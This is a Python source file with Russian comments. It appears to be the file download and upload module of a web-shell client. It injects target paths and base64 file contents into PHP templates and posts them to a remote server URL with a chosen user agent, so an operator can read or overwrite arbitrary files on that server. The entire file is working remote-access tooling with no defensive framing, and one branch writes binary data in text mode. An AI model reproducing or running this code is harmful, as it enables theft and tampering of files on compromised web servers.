import modules.send as send
import modules.exist as exist
from base64 import b64decode
from base64 import b64encode
import os

def dl(url,com,pwd,uagent):
    with open('modules\\edit\\download.php') as f:data = f.read()
    if "/" in com: #Проверка на абсолютный путь удяляемого
        if exist.file(url,com,uagent) == "1":
            data = data.replace("$cat = $_LOCAL;", f"$cat = \'{com}\';")
            print(data)
            file = send.send(url,data,uagent)
            if file !="X":
                x = "edit_tmp\\"+os.path.basename(com)+".txt"
                open(x, "w").write(b64decode(file))
                return x,os.path.basename(com), com
            else:
                print("Файл нечитаем")
        else:
            print("Файла не существует")
    else:
        if exist.file(url,pwd+'/'+com,uagent) == "1":
            data = data.replace("$cat = $_LOCAL;", f"$cat = \'{pwd+'/'+com}\';")
            file = send.send(url,data,uagent)
            if file !="X":
                x = "edit_tmp\\"+com+".txt"
                open(x, "wb").write(b64decode(file))
                return x,com,pwd+'/'+com
            else:
                print("Файл нечитаем")
        else:
            print("Файла не существует")

def ul(url,fte,orname,path,uagent):
    with open('modules\\edit\\upload.php') as f:data = f.read()
    #print(url,fte,orname,path,uagent)
    with open(fte, "rb") as fuf:
        base = b64encode(fuf.read())
    data = data.replace("$cat = $_LOCAL;", f"$cat = \'{path}\';").replace("$base = $_BASE;", f"$base = {base};")
    if send.send(url,data,uagent) != "X":
        print("Файл "+orname+" успешно перезаписан")
    else:
        print("Возникла какая-то ошибка при записи")
